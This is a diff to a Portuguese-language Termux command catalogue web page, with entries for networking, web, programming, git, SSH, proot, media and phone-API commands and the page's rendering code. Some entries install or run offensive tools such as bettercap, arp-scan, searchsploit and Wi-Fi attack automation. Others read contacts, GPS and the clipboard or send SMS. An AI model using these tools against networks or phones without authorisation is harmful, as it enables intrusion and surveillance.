+    { id: 98, cmd: "pkg install exploitdb",               desc: "ExploitDB — banco local de exploits famosos.", level: "avancado", cat: "investigacao", tags: ["exploitdb"] },
+    { id: 99, cmd: "searchsploit apache",                 desc: "SearchSploit — buscar exploits no ExploitDB.", level: "avancado", cat: "investigacao", tags: ["searchsploit"] },
+    { id: 100, cmd: "pkg install bettercap",              desc: "BetterCAP — framework de ataque e monitoramento de rede.", level: "avancado", cat: "rede", tags: ["bettercap"] },
+    { id: 101, cmd: "bettercap -eval 'net.probe on'",     desc: "BetterCAP — descobrir dispositivos na rede.", level: "avancado", cat: "rede", tags: ["bettercap"] },
+    { id: 102, cmd: "pkg install arp-scan",               desc: "Arp-scan — descobrir IPs e MACs na rede local.", level: "avancado", cat: "rede", tags: ["arp-scan"] },
+    { id: 103, cmd: "arp-scan --localnet",                 desc: "Escaneamento ARP de toda rede local.", level: "avancado", cat: "rede", tags: ["arp-scan"] },
+    { id: 104, cmd: "pkg install wifite",                 desc: "Wifite — automatizar ataques a redes Wi-Fi.", level: "avancado", cat: "rede", tags: ["wifite"] },
+    { id: 105, cmd: "pkg install dnsutils",               desc: "DNS Utils — nslookup, dig para consultas DNS.", level: "avancado", cat: "rede", tags: ["dns", "dig"] },
+    { id: 106, cmd: "dig +short google.com",              desc: "Resolver DNS rápido de um domínio.", level: "avancado", cat: "rede", tags: ["dig"] },
+    { id: 107, cmd: "whois google.com",                   desc: "Whois — obter dados de registro de domínio.", level: "avancado", cat: "rede", tags: ["whois"] },
+
+    // =============================================
+    // WEB & SERVIDORES
+    // =============================================
+    { id: 108, cmd: "pkg install python && pip install flask", desc: "Instalar Flask — framework web Python para APIs e sites.", level: "intermediario", cat: "web", tags: ["flask", "python", "web"] },
+    { id: 109, cmd: "python -m http.server 8080",         desc: "Servidor HTTP Python simples para compartilhar arquivos.", level: "intermediario", cat: "web", tags: ["python", "http"] },
+    { id: 110, cmd: "pkg install php",                    desc: "PHP — linguagem server-side para web dinâmica.", level: "intermediario", cat: "web", tags: ["php", "web"] },
+    { id: 111, cmd: "php -S 0.0.0.0:8080",               desc: "Servidor PHP embutido rodando na porta 8080.", level: "intermediario", cat: "web", tags: ["php", "server"] },
+    { id: 112, cmd: "pkg install nginx",                  desc: "Nginx — servidor web reverso e proxy.", level: "intermediario", cat: "web", tags: ["nginx", "servidor"] },
+    { id: 113, cmd: "pkg install nodejs && npm init -y",  desc: "Iniciar projeto Node.js com package.json.", level: "intermediario", cat: "web", tags: ["nodejs", "npm"] },
+    { id: 114, cmd: "npm install express",                desc: "ExpressJS — framework web para Node.js.", level: "intermediario", cat: "web", tags: ["express", "nodejs"] },
+    { id: 115, cmd: "curl ifconfig.me",                   desc: "Descobrir seu IP público externo.", level: "intermediario", cat: "web", tags: ["curl", "ip"] },
+    { id: 116, cmd: "pkg install postgresql",             desc: "PostgreSQL — banco relacional avançado.", level: "intermediario", cat: "web", tags: ["postgresql", "banco"] },
+    { id: 117, cmd: "pkg install redis",                  desc: "Redis — banco chave-valor em memória para cache.", level: "intermediario", cat: "web", tags: ["redis", "cache"] },
+    { id: 118, cmd: "wget --mirror -p --convert-links URL", desc: "Baixar site inteiro para backup offline.", level: "avancado", cat: "web", tags: ["wget", "mirror"] },
+
+    // =============================================
+    // PROGRAMAÇÃO
+    // =============================================
+    { id: 119, cmd: "pip install requests",               desc: "Requests — biblioteca Python para requisições HTTP.", level: "intermediario", cat: "programacao", tags: ["requests", "python"] },
+    { id: 120, cmd: "pip install beautifulsoup4",         desc: "BeautifulSoup4 — web scraping com Python.", level: "intermediario", cat: "programacao", tags: ["beautifulsoup", "scraping"] },
+    { id: 121, cmd: "pip install pandas",                 desc: "Pandas — análise e manipulação de dados.", level: "intermediario", cat: "programacao", tags: ["pandas", "dados"] },
+    { id: 122, cmd: "pip install numpy",                  desc: "NumPy — computação numérica e matrizes.", level: "intermediario", cat: "programacao", tags: ["numpy"] },
+    { id: 123, cmd: "pip install discord.py",             desc: "Criar bot para Discord com Python.", level: "intermediario", cat: "programacao", tags: ["discord", "bot"] },
+    { id: 124, cmd: "pkg install go",                     desc: "Go — linguagem compilada rápida.", level: "avancado", cat: "programacao", tags: ["golang", "go"] },
+    { id: 125, cmd: "pkg install rust",                   desc: "Rust — linguagem segura e performática.", level: "avancado", cat: "programacao", tags: ["rust"] },
+    { id: 126, cmd: "pkg install gcc",                    desc: "GCC — compilador C/C++ no Termux.", level: "avancado", cat: "programacao", tags: ["gcc", "c"] },
+    { id: 127, cmd: "pkg install lua",                    desc: "Lua — linguagem leve para scripts.", level: "avancado", cat: "programacao", tags: ["lua"] },
+    { id: 128, cmd: "pkg install ruby",                   desc: "Ruby — linguagem para web e scripts.", level: "avancado", cat: "programacao", tags: ["ruby"] },
+    { id: 129, cmd: "pip install opencv-python",          desc: "OpenCV — visão computacional.", level: "avancado", cat: "programacao", tags: ["opencv"] },
+    { id: 130, cmd: "pip install tensorflow",             desc: "TensorFlow — machine learning.", level: "avancado", cat: "programacao", tags: ["tensorflow", "ml"] },
+    { id: 131, cmd: "pip install torch",                  desc: "PyTorch — deep learning.", level: "avancado", cat: "programacao", tags: ["pytorch"] },
+    { id: 132, cmd: "npm install socket.io",              desc: "Socket.IO — comunicação bidirecional em tempo real.", level: "intermediario", cat: "programacao", tags: ["socket.io"] },
+
+    // =============================================
+    // GIT & GITHUB
+    // =============================================
+    { id: 133, cmd: "git clone https://github.com/carlos46743/clube-do-termux", desc: "Clonar o repositório oficial do Clube do Termux.", level: "basico", cat: "git", tags: ["clone", "clube-do-termux"], repo: "clube-do-termux", repoUrl: "https://github.com/carlos46743/clube-do-termux" },
+    { id: 134, cmd: "git init && git add . && git commit -m 'init'", desc: "Iniciar repositório Git e fazer primeiro commit.", level: "intermediario", cat: "git", tags: ["git", "init"] },
+    { id: 135, cmd: "git push origin main",               desc: "Enviar commits para branch main do repositório.", level: "intermediario", cat: "git", tags: ["git", "push"] },
+    { id: 136, cmd: "git pull origin main",               desc: "Atualizar branch local com mudanças do remoto.", level: "intermediario", cat: "git", tags: ["git", "pull"] },
+    { id: 137, cmd: "git checkout -b feature-nova",       desc: "Criar e trocar para nova branch.", level: "intermediario", cat: "git", tags: ["git", "branch"] },
+    { id: 138, cmd: "git log --oneline --graph --all",    desc: "Visualizar histórico de commits em grafo.", level: "intermediario", cat: "git", tags: ["git", "log"] },
+
+    // =============================================
+    // SSH & REMOTO
+    // =============================================
+    { id: 139, cmd: "pkg install openssh && ssh-keygen",  desc: "Gerar chave SSH para autenticação segura.", level: "intermediario", cat: "ssh", tags: ["ssh", "keygen"] },
+    { id: 140, cmd: "ssh-copy-id usuario@ip",             desc: "Copiar chave pública SSH para servidor remoto.", level: "intermediario", cat: "ssh", tags: ["ssh-copy-id"] },
+    { id: 141, cmd: "pkg install rsync",                  desc: "Rsync — sincronização eficiente de arquivos.", level: "intermediario", cat: "ssh", tags: ["rsync", "sync"] },
+    { id: 142, cmd: "scp arquivo.txt user@ip:/home/",     desc: "Copiar arquivo via SSH com SCP.", level: "intermediario", cat: "ssh", tags: ["scp", "ssh"] },
+
+    // =============================================
+    // SISTEMA & PROOT
+    // =============================================
+    { id: 143, cmd: "pkg install proot",                  desc: "Proot — rodar distribuições Linux sem root.", level: "avancado", cat: "sistema", tags: ["proot", "linux"] },
+    { id: 144, cmd: "pkg install proot-distro",           desc: "Proot-distro — gerenciar distribuições Linux.", level: "avancado", cat: "sistema", tags: ["proot-distro"] },
+    { id: 145, cmd: "proot-distro install ubuntu",        desc: "Instalar Ubuntu no Termux via proot.", level: "avancado", cat: "sistema", tags: ["ubuntu", "proot"] },
+    { id: 146, cmd: "proot-distro install debian",        desc: "Instalar Debian no Termux.", level: "avancado", cat: "sistema", tags: ["debian", "proot"] },
+    { id: 147, cmd: "proot-distro install kali",          desc: "Instalar Kali Linux no Termux (sem root).", level: "avancado", cat: "sistema", tags: ["kali", "proot"] },
+    { id: 148, cmd: "proot-distro login ubuntu",          desc: "Entrar no Ubuntu instalado via proot.", level: "avancado", cat: "sistema", tags: ["proot", "ubuntu"] },
+    { id: 149, cmd: "pkg install x11-repo",              desc: "Adicionar repositório X11 para apps gráficos.", level: "avancado", cat: "sistema", tags: ["x11", "repo"] },
+    { id: 150, cmd: "pkg install xfce4 tigervnc",        desc: "XFCE + VNC — desktop gráfico no Termux.", level: "avancado", cat: "sistema", tags: ["xfce", "vnc", "desktop"] },
+    { id: 151, cmd: "vncserver :1",                      desc: "Iniciar servidor VNC na porta 5901.", level: "avancado", cat: "sistema", tags: ["vncserver"] },
+    { id: 152, cmd: "pkg install code-server",           desc: "code-server — VS Code rodando no navegador.", level: "avancado", cat: "sistema", tags: ["code-server", "vscode"] },
+
+    // =============================================
+    // MÍDIA
+    // =============================================
+    { id: 153, cmd: "ffmpeg -i video.mp4 -vf scale=640:480 output.mp4", desc: "Redimensionar vídeo para 640x480 com FFmpeg.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
+    { id: 154, cmd: "ffmpeg -i video.mp4 -ss 00:01:30 -t 5 clip.mp4", desc: "Cortar clipe de 5 segundos.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
+    { id: 155, cmd: "ffmpeg -i video.mp4 -vn -c:a mp3 audio.mp3", desc: "Extrair áudio de vídeo para MP3.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
+    { id: 156, cmd: "ffmpeg -f image2 -i frame%04d.png video.mp4", desc: "Criar vídeo a partir de imagens.", level: "avancado", cat: "midia", tags: ["ffmpeg"] },
+    { id: 157, cmd: "yt-dlp -x --audio-format mp3 'URL'", desc: "Baixar apenas áudio em MP3.", level: "intermediario", cat: "midia", tags: ["yt-dlp"] },
+
+    // =============================================
+    // DIVERSÃO
+    // =============================================
+    { id: 158, cmd: "pkg install cmatrix",               desc: "Cmatrix — chuva de códigos verde estilo Matrix.", level: "basico", cat: "diversao", tags: ["cmatrix", "matrix"] },
+    { id: 159, cmd: "pkg install sl",                    desc: "SL — trem atravessa a tela quando você erra 'ls'.", level: "basico", cat: "diversao", tags: ["sl", "easter-egg"] },
+    { id: 160, cmd: "pkg install cowsay",                desc: "Cowsay — vaca falante em ASCII.", level: "basico", cat: "diversao", tags: ["cowsay", "ascii"] },
+    { id: 161, cmd: "pkg install lolcat",                desc: "Lolcat — output colorido arco-íris.", level: "basico", cat: "diversao", tags: ["lolcat"] },
+    { id: 162, cmd: "pkg install nyancat",               desc: "Nyancat — gato nyan animado no terminal.", level: "basico", cat: "diversao", tags: ["nyancat"] },
+    { id: 163, cmd: "pkg install pipes.sh",              desc: "Pipes — animação de tubos 3D.", level: "basico", cat: "diversao", tags: ["pipes"] },
+    { id: 164, cmd: "pkg install asciiquarium",          desc: "Aquário com peixes animados em ASCII.", level: "basico", cat: "diversao", tags: ["asciiquarium"] },
+    { id: 165, cmd: "pkg install fortune",               desc: "Fortune — citações aleatórias.", level: "basico", cat: "diversao", tags: ["fortune"] },
+    { id: 166, cmd: "pkg install bpytop",                desc: "Bpytop — monitor de sistema colorido.", level: "basico", cat: "diversao", tags: ["bpytop"] },
+
+    // =============================================
+    // TERMUX API
+    // =============================================
+    { id: 167, cmd: "termux-wifi-scaninfo",              desc: "Escaneie redes Wi-Fi ao redor.", level: "basico", cat: "api", tags: ["wifi"] },
+    { id: 168, cmd: "termux-camera-photo /sdcard/foto.jpg", desc: "Tirar foto via câmera do terminal.", level: "basico", cat: "api", tags: ["camera"] },
+    { id: 169, cmd: "termux-battery-status",             desc: "Ver status da bateria do celular.", level: "basico", cat: "api", tags: ["bateria"] },
+    { id: 170, cmd: "termux-tts-speak \"Hello\"",        desc: "Texto-para-fala: celular fala a frase.", level: "basico", cat: "api", tags: ["tts"] },
+    { id: 171, cmd: "termux-torch on",                   desc: "Ligar flash da câmera (lanterna).", level: "basico", cat: "api", tags: ["torch"] },
+    { id: 172, cmd: "termux-vibrate -d 500",             desc: "Vibrar o celular por 500ms.", level: "basico", cat: "api", tags: ["vibrate"] },
+    { id: 173, cmd: "termux-notification --title \"Oi\" --content \"Mundo\"", desc: "Enviar notificação push do terminal.", level: "basico", cat: "api", tags: ["notificacao"] },
+    { id: 174, cmd: "termux-clipboard-set texto",        desc: "Copiar texto para área de transferência.", level: "basico", cat: "api", tags: ["clipboard"] },
+    { id: 175, cmd: "termux-clipboard-get",              desc: "Ler texto da área de transferência.", level: "basico", cat: "api", tags: ["clipboard"] },
+    { id: 176, cmd: "termux-contact-list",               desc: "Listar contatos do celular.", level: "intermediario", cat: "api", tags: ["contatos"] },
+    { id: 177, cmd: "termux-sms-send -n 5511999999999 \"Oi\"", desc: "Enviar SMS via terminal.", level: "intermediario", cat: "api", tags: ["sms"] },
+    { id: 178, cmd: "termux-location",                   desc: "Obter coordenadas GPS atuais.", level: "intermediario", cat: "api", tags: ["gps"] },
+    { id: 179, cmd: "termux-sensor -s \"Accelerometer\" -n 1", desc: "Ler dados do acelerômetro.", level: "intermediario", cat: "api", tags: ["sensor"] },
   ];
 
   const categories = [
-    { id: 'iniciante', label: '🚀 Iniciante', icon: 'fa-seedling' },
-    { id: 'midia', label: '🎵 Mídia & Áudio', icon: 'fa-music' },
-    { id: 'api', label: '📱 Termux API', icon: 'fa-microchip' },
-    { id: 'diversao', label: '🎮 Diversão', icon: 'fa-gamepad' },
-    { id: 'sistema', label: '⚙️ Sistema', icon: 'fa-cog' },
-    { id: 'web', label: '🌐 Web & Servidores', icon: 'fa-globe' },
-    { id: 'programacao', label: '💻 Programação', icon: 'fa-code' },
-    { id: 'git', label: '🔗 Git & GitHub', icon: 'fa-code-branch' },
-    { id: 'ssh', label: '🔐 SSH & Remoto', icon: 'fa-lock' },
-    { id: 'rede', label: '📡 Rede', icon: 'fa-wifi' },
-    { id: 'pentest', label: '☠️ Pentest & Hacking', icon: 'fa-skull' },
+    { id: 'iniciante', label: 'Iniciante', icon: 'fa-seedling' },
+    { id: 'personalizar', label: 'Personalização (Repos)', icon: 'fa-paint-brush' },
+    { id: 'investigacao', label: 'Pentest & Investigação', icon: 'fa-skull' },
+    { id: 'rede', label: 'Rede', icon: 'fa-wifi' },
+    { id: 'web', label: 'Web & Servidores', icon: 'fa-globe' },
+    { id: 'programacao', label: 'Programação', icon: 'fa-code' },
+    { id: 'git', label: 'Git & GitHub', icon: 'fa-code-branch' },
+    { id: 'ssh', label: 'SSH & Remoto', icon: 'fa-lock' },
+    { id: 'sistema', label: 'Sistema & Proot', icon: 'fa-cog' },
+    { id: 'midia', label: 'Mídia', icon: 'fa-music' },
+    { id: 'diversao', label: 'Diversão', icon: 'fa-gamepad' },
+    { id: 'api', label: 'Termux API', icon: 'fa-microchip' },
   ];
 
-  // ===== GENERATE PARTICLES =====
   (function initParticles() {
-    const container = document.getElementById('particles');
+    const c = document.getElementById('particles');
     for (let i = 0; i < 30; i++) {
       const p = document.createElement('div');
       p.className = 'particle';
@@ -922,11 +1021,10 @@
       p.style.animationDelay = Math.random() * 6 + 's';
       p.style.animationDuration = (4 + Math.random() * 4) + 's';
       p.style.width = p.style.height = (2 + Math.random() * 3) + 'px';
-      container.appendChild(p);
+      c.appendChild(p);
     }
   })();
 
-  // ===== RENDER TUTORIALS =====
   const container = document.getElementById('tutorialsContainer');
   const searchInput = document.getElementById('searchInput');
   const clearBtn = document.getElementById('clearBtn');
@@ -934,10 +1032,8 @@
   const resultCount = document.getElementById('resultCount');
   const noResults = document.getElementById('noResults');
   const totalTuts = document.getElementById('totalTuts');
-
   let activeFilter = 'all';
   let searchTerm = '';
-
   totalTuts.textContent = tutorials.length + '+';
 
   function getLevelBadge(level) {
@@ -945,8 +1041,8 @@
     return `<span class="level ${level}">${labels[level] || level}</span>`;
   }
 
-  function escapeHtml(str) {
-    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  function escapeHtml(s) {
+    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
   }
 
   function render() {
@@ -962,14 +1058,12 @@
       return true;
     });
 
-    const totalFiltered = filtered.length;
     resultCount.textContent = searchTerm || activeFilter !== 'all'
-      ? `Mostrando ${totalFiltered} de ${tutorials.length} tutoriais`
+      ? `Mostrando ${filtered.length} de ${tutorials.length} tutoriais`
       : `Mostrando todos os ${tutorials.length} tutoriais`;
 
     noResults.classList.toggle('show', filtered.length === 0);
 
-    // Group by category
     const grouped = {};
     filtered.forEach(t => {
       if (!grouped[t.cat]) grouped[t.cat] = [];
@@ -979,7 +1073,6 @@
     categories.forEach(cat => {
       const tuts = grouped[cat.id];
       if (!tuts || tuts.length === 0) return;
-
       const section = document.createElement('div');
       section.className = 'category';
       section.id = 'cat-' + cat.id;
@@ -992,27 +1085,29 @@
         </div>
         <div class="tutorial-grid"></div>
       `;
-
       const grid = section.querySelector('.tutorial-grid');
       tuts.forEach(t => {
         const card = document.createElement('div');
         card.className = 'tutorial-card';
         card.dataset.id = t.id;
+        let repoBadge = '';
+        if (t.repo) {
+          repoBadge = `<div class="repo-badge"><i class="fab fa-github"></i> ${t.repo}</div>`;
+        }
         card.innerHTML = `
           <button class="copy-btn" title="Copiar comando"><i class="fas fa-copy"></i></button>
           <div class="num">#${String(t.id).padStart(3, '0')} ${getLevelBadge(t.level)}</div>
           <div class="cmd"><i class="fas fa-chevron-right"></i> ${escapeHtml(t.cmd)}</div>
           <div class="desc">${escapeHtml(t.desc)}</div>
+          ${repoBadge}
           <div class="tags">
             ${t.tags.slice(0, 3).map(tag => `<span class="tag cmd-tag">#${tag}</span>`).join('')}
           </div>
         `;
-
         card.addEventListener('click', (e) => {
           if (e.target.closest('.copy-btn')) return;
           openModal(t);
         });
-
         const copyBtn = card.querySelector('.copy-btn');
         copyBtn.addEventListener('click', (e) => {
           e.stopPropagation();
@@ -1025,11 +1120,8 @@
             }, 2000);
           });
         });
-
         grid.appendChild(card);
       });
-
-      // Toggle collapse on header click
       const header = section.querySelector('.category-header');
       header.addEventListener('click', () => {
         section.classList.toggle('collapsed');
@@ -1037,19 +1129,15 @@
         icon.classList.toggle('fa-chevron-down');
         icon.classList.toggle('fa-chevron-up');
       });
-
       container.appendChild(section);
     });
-
-    // Build quick nav
     buildQuickNav();
   }
 
   function buildQuickNav() {
     const nav = document.getElementById('quickNav');
     nav.innerHTML = '';
-    const sections = container.querySelectorAll('.category');
-    sections.forEach(s => {
+    container.querySelectorAll('.category').forEach(s => {
       const a = document.createElement('a');
       a.href = '#' + s.id;
       a.title = s.querySelector('h2')?.textContent || '';
@@ -1057,7 +1145,6 @@
     });
   }
 
-  // ===== MODAL =====
   const modalOverlay = document.getElementById('modalOverlay');
   const modalTitle = document.getElementById('modalTitle');
   const modalDesc = document.getElementById('modalDesc');
@@ -1065,13 +1152,22 @@
   const modalOutput = document.getElementById('modalOutput');
   const modalClose = document.getElementById('modalClose');
   const modalCopyBtn = document.getElementById('modalCopyBtn');
+  const modalRepoLink = document.getElementById('modalRepoLink');
+  const modalRepoName = document.getElementById('modalRepoName');
 
   function openModal(t) {
     modalTitle.textContent = `#${String(t.id).padStart(3, '0')} · ${t.cmd.substring(0, 40)}${t.cmd.length > 40 ? '...' : ''}`;
     modalDesc.textContent = t.desc;
     modalCmd.textContent = t.cmd;
 
-    // Simulated terminal output
+    if (t.repo && t.repoUrl) {
+      modalRepoLink.style.display = 'inline-flex';
+      modalRepoLink.href = t.repoUrl;
+      modalRepoName.textContent = t.repo;
+    } else {
+      modalRepoLink.style.display = 'none';
+    }
+
     const outputs = {
       basico: [
         '<span class="prompt-symbol">$</span> <span class="output-text">Reading package lists... Done</span>',
@@ -1084,14 +1180,13 @@
         '<span class="prompt-symbol">✓</span> <span class="output-text" style="color:#00ff88;">Build complete — 0 errors</span>',
       ],
       avancado: [
-        '<span class="prompt-symbol">#</span> <span class="output-text">Initializing exploit module...</span>',
-        '<span class="prompt-symbol">#</span> <span class="output-text">Target: 192.168.0.1:80 — Status: Online</span>',
+        '<span class="prompt-symbol">#</span> <span class="output-text">Initializing module...</span>',
+        '<span class="prompt-symbol">#</span> <span class="output-text">Target: 192.168.0.1 — Status: Online</span>',
         '<span class="prompt-symbol">!</span> <span class="output-text" style="color:#ff5a5a;">Use responsibly · Ethical hacking only</span>',
       ],
     };
     const outLines = outputs[t.level] || outputs.basico;
     modalOutput.innerHTML = outLines.map(l => `<div>${l}</div>`).join('');
-
     modalOverlay.classList.add('open');
   }
 
@@ -1112,7 +1207,6 @@
     });
   });
 
-  // ===== SEARCH =====
   searchInput.addEventListener('input', () => {
     searchTerm = searchInput.value;
     clearBtn.classList.toggle('show', searchTerm.length > 0);
@@ -1126,7 +1220,6 @@
     render();
   });
 
-  // ===== FILTERS =====
   filterGroup.addEventListener('click', (e) => {
     const btn = e.target.closest('.filter-btn');
     if (!btn) return;
@@ -1136,7 +1229,6 @@
     render();
   });
 
-  // ===== INIT =====
   render();
 </script>
 
